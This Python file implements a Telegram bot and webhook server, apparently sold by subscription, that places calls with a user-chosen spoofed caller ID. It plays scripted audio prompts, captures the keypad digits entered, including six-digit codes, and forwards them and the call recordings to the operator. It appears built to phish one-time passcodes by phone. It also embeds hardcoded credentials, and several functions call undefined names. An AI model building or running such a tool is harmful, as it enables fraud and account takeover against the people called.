import os
import logging
import requests
import threading
import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI, Request
from fastapi import HTTPException
from fastapi.responses import FileResponse
import uvicorn
import asyncio
import aiohttp
from database import Database
from bot_config import bot, dp, TOKEN
import script  # Import the script module that contains the script creation logic
from aiogram.dispatcher import FSMContext

# Initialize FastAPI app
app = FastAPI()

# Initialize the database
db = Database(
    host="localhost",
    port_id=5432,
    database="mydatabase",
    user="postgres",
    password="root"
)

db.connect()
db.create_table()

# Load sensitive values from environment variables
API_KEY = os.getenv('API_KEY', 'daadd383-3eb8-4554-84d1-7ec12eebda9d')
NGROK_URL = os.getenv('NGROK_URL', 'https://ec39-2409-40c2-e-8fa0-6c61-543d-4cdc-d76c.ngrok-free.app')
YOUR_ADMIN_ID = int(os.getenv('YOUR_ADMIN_ID', '1384634165'))

# Set up logging
logging.basicConfig(level=logging.INFO)

# Telegram bot setup
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# Subscription system
subscribed_users = set()

def load_subscribed_users():
    global subscribed_users
    logging.info("Loading subscribed users...")
    try:
        db.cursor.execute("SELECT user_id FROM subscription_keys WHERE user_id IS NOT NULL")
        subscribed_users_list = db.cursor.fetchall()
        subscribed_users = {user[0] for user in subscribed_users_list}
        logging.info(f"Subscribed users loaded: {subscribed_users}")
    except Exception as e:
        logging.error(f"Error loading subscribed users: {e}")

load_subscribed_users()

@app.post('/webhook/{chatid}/{scriptid}')
async def webhook(chatid: int, scriptid: str, request: Request):
    data = await request.json()
    logging.info(f"Incoming webhook data for chatid {chatid}: {data}")

    if not data or 'state' not in data:
        return {"status": "error", "message": "Invalid data format"}

    event = data['state']
    logging.info(f"Event received for chatid {chatid}: {event}")

    session = db.get_session(chatid)
    if not session:
        logging.error(f"No session found in the database for chatid {chatid}")
        return {"status": "error", "message": "No session found for chatid"}

    uuid = session['uuid']
    logging.info(f"UUID retrieved from the database for chatid {chatid}: {uuid}")

    try:
        if event == 'call.ringing':
            logging.info(f"Call is ringing for user {chatid}")
        
        elif event == 'call.answered':
            await send_message_to_user(chatid, "The call has been answered.")
            url = "https://articunoapi.com:8443/gather-audio"
            payload = {
                'uuid': uuid,
                'audiourl': 'https://ec39-2409-40c2-e-8fa0-6c61-543d-4cdc-d76c.ngrok-free.app/scripts/lesna242611/part1.wav',
                'maxdigits': '1'
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload) as response:
                    logging.info(f"Gather audio response for chatid {chatid}: {response.status} - {await response.text()}")

        elif event == 'dtmf.gathered':
            digits = data.get('digits', '')
            logging.info(f"Digits gathered for chatid {chatid}: {digits}")

            if digits == '1':
                logging.info("User pressed 1 during the first gather")
                await send_message_to_user(chatid, "You pressed 1.")
                await play_next_gather_audio(uuid, chatid)
            else:
                await send_message_to_user(chatid, f"Gathered digits: {digits}")
                await ask_if_digits_correct(chatid, digits)

        elif event == 'call.complete':
            logging.info(f"Call with chatid {chatid} and UUID {uuid} has been completed.")
            await bot.send_message(chatid, "The call has ended.")
            
            # After the call ends, retrieve the recording URL and send the recording to the user
            recording_url = data.get('recording_url')
            if recording_url:
                file_path = await download_recording(recording_url)
                if file_path:
                    await send_audio_to_user(chatid, file_path)
                    os.remove(file_path)  # Clean up the file after sending
            else:
                await send_message_to_user(chatid, "No recording URL was provided.")

        else:
            logging.info(f"Unhandled event for chatid {chatid}: {event}")

        return {"status": "success"}

    except Exception as e:
        logging.error(f"Exception occurred: {e}")
        return {"status": "error", "message": str(e)}        

@app.get("/scripts/{script_id}/{filename}")
async def get_script_file(script_id: str, filename: str):
    file_path = f"./scripts/{script_id}/{filename}"

    if not os.path.exists(file_path):
        logging.error(f"File not found: {file_path}")
        raise HTTPException(status_code=404, detail="File not found")
    
    if not os.access(file_path, os.R_OK):
        logging.error(f"File is not readable: {file_path}")
        raise HTTPException(status_code=403, detail="File is not readable")

    try:
        return FileResponse(path=file_path, media_type='audio/wav')
    except Exception as e:
        logging.error(f"Error serving file {file_path}: {e}")
        raise HTTPException(status_code=500, detail="Internal Server Error")



async def download_recording(url):
    """Downloads the recording from the given URL and saves it locally."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    file_name = url.split("/")[-1]  # Get the file name from the URL
                    file_path = f"/tmp/{file_name}"
                    with open(file_path, 'wb') as f:
                        f.write(await response.read())
                    return file_path
                else:
                    logging.error(f"Failed to download the recording: {response.status}")
                    return None
    except Exception as e:
        logging.error(f"Error downloading recording: {e}")
        return None

async def send_audio_to_user(chatid, file_path):
    """Sends the downloaded audio file to the user."""
    try:
        with open(file_path, 'rb') as audio:
            await bot.send_audio(chatid, audio, caption="Here is your recording.")
        logging.info(f"Recording sent to chat_id {chatid}: {file_path}")
    except Exception as e:
        logging.error(f"Failed to send recording to chat_id {chatid}: {e}")

async def send_message_to_user(chat_id, message):
    try:
        await bot.send_message(chat_id, message)
        logging.info(f"Message sent to chat_id {chat_id}: {message}")
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chat_id}: {e}")

async def ask_if_digits_correct(chatid, digits):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Correct", callback_data=f'correct_{chatid}'))
    markup.add(InlineKeyboardButton("Wrong", callback_data=f'wrong_{chatid}'))
    try:
        await bot.send_message(chatid, f"The gathered digits are: {digits}. Are they correct?", reply_markup=markup)
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chatid}: {e}")

async def play_next_gather_audio(uuid, chatid):
    next_audiourl = "https://ec39-2409-40c2-e-8fa0-6c61-543d-4cdc-d76c.ngrok-free.app/scripts/lesna242611/part2.wav"
    url = "https://articunoapi.com:8443/gather-audio"
    payload = {
        'uuid': uuid,
        'audiourl': next_audiourl,
        'maxdigits': '6'
    }

    while True:
        try:
            response = requests.post(url=url, json=payload)
            response.raise_for_status()
            
            data = response.json()
            event = data.get('event')
            
            if event == 'dtmf.gathered':
                digits = data.get('digits', '')
                if digits:
                    await send_message_to_user(chatid, f"Gathered digits: {digits}")
                    await ask_if_digits_correct(chatid, digits)
                    break
            elif event == 'dtmf.entered':
                digit = data.get('digit', '')
                if digit:
                    await send_message_to_user(chatid, f"Entered digit: {digit}")
                    break
            else:
                await asyncio.sleep(40)
        
        except requests.RequestException as e:
            logging.error(f"Error playing next gather audio: {e}")
            break

@dp.callback_query_handler(lambda c: c.data and (c.data.startswith('correct_') or c.data.startswith('wrong_')))
async def handle_digit_confirmation(callback_query: types.CallbackQuery):
    action, chatid = callback_query.data.split('_')
    chatid = int(chatid)

    session = db.get_session(chatid)
    if not session:
        return
    
    uuid = session['uuid']

    if action == 'correct':
        await callback_query.answer("Thank you, hanging up the call.")
        await hangup_call(uuid)
    elif action == 'wrong':
        await callback_query.answer("Playing the third script.")
        await play_third_script(uuid, chatid)

async def play_third_script(uuid, chatid):
    third_audiourl = "https://sourceotp.online/scripts/519396535475163/output3.wav"
    url = "https://articunoapi.com:8443/gather-audio"
    payload = {
        'uuid': uuid,
        'audiourl': third_audiourl,
        'maxdigits': '6'
    }

    while True:
        try:
            response = requests.post(url=url, json=payload)
            response.raise_for_status()
            break
        except requests.RequestException as e:
            logging.error(f"Error playing third script audio: {e}")
            break

async def hangup_call(uuid):
    try:
        url = f"https://articunoapi.com:8443/hangup?uuid={uuid}"
        response = requests.post(url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        logging.error(f"Error hanging up call: {e}")
        return None

async def hold_call(uuid):
    url = f"https://articunoapi.com:8443/hold?uuid={uuid}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url) as response:
                response.raise_for_status()
                return await response.json()
        except aiohttp.ClientError as e:
            logging.error(f"Error holding call: {e}")
            return None

async def create_call_api(api_key, callback_url, to_number, from_number, name, scriptname, chatid):
    try:
        url = "https://articunoapi.com:8443/create-call"
        webhook_url = f"{callback_url}/webhook/{chatid}/{scriptname}"
        payload = {
            "api_key": api_key,
            "callbackURL": webhook_url,
            "to_": to_number,
            "from_": from_number,
            "name": name,
        }
        response = requests.post(url, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        logging.error(f"Error creating call: {e}")
        return None

@dp.message_handler(commands=["create_call"])
async def create_call(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    args = message.text.split(' ')[1:]
    if len(args) != 4:
        await message.reply('Invalid arguments. Please use /create_call destination_number caller_id name scriptname')
        return
    destination_number, caller_id, name, scriptname = args
    response = await create_call_api(API_KEY, NGROK_URL, destination_number, caller_id, name, scriptname, message.chat.id)
    if response is not None:
        await message.reply('Create call response:')
        await message.reply(response)
        if 'uuid' in response:
            uuid = response['uuid']
            logging.info(f"Storing UUID {uuid} for chatid {message.chat.id}")
            db.store_session(message.chat.id, uuid)
            stored_session = db.get_session(message.chat.id)
            logging.info(f"Stored session retrieved: {stored_session}")
            if stored_session:
                logging.info(f"Successfully stored and retrieved UUID: {stored_session['uuid']}")
            else:
                logging.error("Failed to store session in the database.")
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton('Hangup', callback_data=f'hangup_{uuid}'))
            await message.reply('Call initiated successfully!', reply_markup=markup)
        else:
            await message.reply('Call failed to initiate.')
    else:
        await message.reply('Call failed to initiate.')

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    user_first_name = message.from_user.first_name
    welcome_message = (
        f"🌟🤖 Welcome to LESNO - 𝘽𝙊𝙏 🌟🤖\n\n"
        f"HELLO, {user_first_name}! Welcome to LESNO - BOT.\n\n"
        f"GET READY FOR A NEW JOURNEY WITH OUR RELIABLE BOT.\n\n"
        f"CHEAP AND AFFORDABLE FOR ALL WITH GOOD QUALITY.\n\n"
        f"🔑 Features included:\n"
        f"🛎️ 24/7 Support\n"
        f"🤑 Automated Payment System\n"
        f"🔍 Live Panel Feeling\n"
        f"🎭 Customizable Caller ID\n"
        f"⏱️ 99.99% Up-time\n"
        f"🛠️ Customizable Scripts\n\n"
        f"/create_call destination_number caller_id name scriptname\n"
        f"/balance\n"
        f"/subscribe <key>\n"
        f"/generate_key <days>\n"
        f"/create_script part1 part2 part3 part4 part5\n"
    )
    await message.reply(welcome_message)

@dp.message_handler(commands=["balance"])
async def balance(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    response = get_balance(API_KEY)
    if response and 'balance' in response:
        balance = response['balance']
        await message.reply(f"Your current balance is: {balance}")
    else:
        await message.reply("Failed to retrieve balance.")

@dp.message_handler(commands=["subscribe"])
async def subscribe(message: types.Message):
    try:
        key = message.text.split(" ")[1]
        db_key = db.get_key(key)
        if db_key:
            if db_key[1] is None:  # Check if the key has not been redeemed by any user yet
                db.update_key(key, message.chat.id, db_key[2])  # Update the key with the current user's ID
                subscribed_users.add(message.chat.id)
                await message.reply("You have been subscribed.")
            elif db_key[1] == message.chat.id:
                await message.reply("You are already subscribed.")
            else:
                await message.reply("This key has already been redeemed.")
        else:
            await message.reply("Invalid key.")
    except IndexError:
        await message.reply("Please provide a valid subscription key.")

@dp.message_handler(commands=["generate_key"])
async def generate_key(message: types.Message):
    if message.chat.id != YOUR_ADMIN_ID:
        await message.reply('You are not authorized to generate subscription keys.')
        return
    try:
        days = int(message.text.split(' ')[1])
        key = os.urandom(16).hex()
        expiry_time = datetime.datetime.now() + datetime.timedelta(days=days)
        db.insert_key(key, None, expiry_time.strftime("%Y-%m-%d %H:%M:%S"))
        await message.reply(f'Generated subscription key: {key} (expires on {expiry_time})')
    except (IndexError, ValueError):
        await message.reply('Invalid arguments. Please use /generate_key <days>')

def get_available_voices():
    """Retrieve and return a list of available voices from Azure TTS."""
    try:
        speech_config = speechsdk.SpeechConfig(subscription=AZURE_SPEECH_KEY, region=AZURE_SPEECH_REGION)
        synthesizer = speechsdk.SpeechSynthesizer(speech_config=speech_config)
        
        voices = synthesizer.get_voices_async().get()
        
        if voices.reason == speechsdk.ResultReason.VoicesListRetrieved:
            return [voice for voice in voices.voices]
        else:
            print(f"Failed to retrieve voices. Reason: {voices.reason}")
            return []
    except Exception as e:
        print(f"Error retrieving voices: {e}")
        return []

@dp.message_handler(commands=["list_voices"])
async def list_voices(message: types.Message):
    available_voices = get_available_voices()

    if available_voices:
        voice_list = "\n".join([f"{voice.short_name} - {voice.local_name} ({voice.locale})" for voice in available_voices])

        # Split the voice list into chunks
        for chunk in [voice_list[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(voice_list), MAX_MESSAGE_LENGTH)]:
            await message.reply(chunk)
    else:
        await message.reply("Failed to retrieve available voices.")

@dp.message_handler(commands=["create_script"])
async def create_script_command(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    await script.start_script_creation(message)

@dp.message_handler(lambda message: script.db.get_state(message.chat.id).get('script_id'))
async def handle_script_part(message: types.Message):
    await script.handle_part(message)

async def set_default_commands(dp):
    await dp.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("create_call", "Create a new call"),
        BotCommand("balance", "Check your balance"),
        BotCommand("subscribe", "Subscribe to the bot"),
        BotCommand("generate_key", "Generate a subscription key"),
        BotCommand("create_script", "Create a new script"),  # Ensure this command is listed here
    ])

async def run_bot_and_server():
    # Start the FastAPI server in a background task
    config = uvicorn.Config(app, host="0.0.0.0", port=5000)
    server = uvicorn.Server(config)
    loop = asyncio.get_event_loop()
    loop.create_task(server.serve())

    # Start bot polling in the main task
    await set_default_commands(dp)
    from aiogram import executor
    await dp.start_polling()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_bot_and_server())
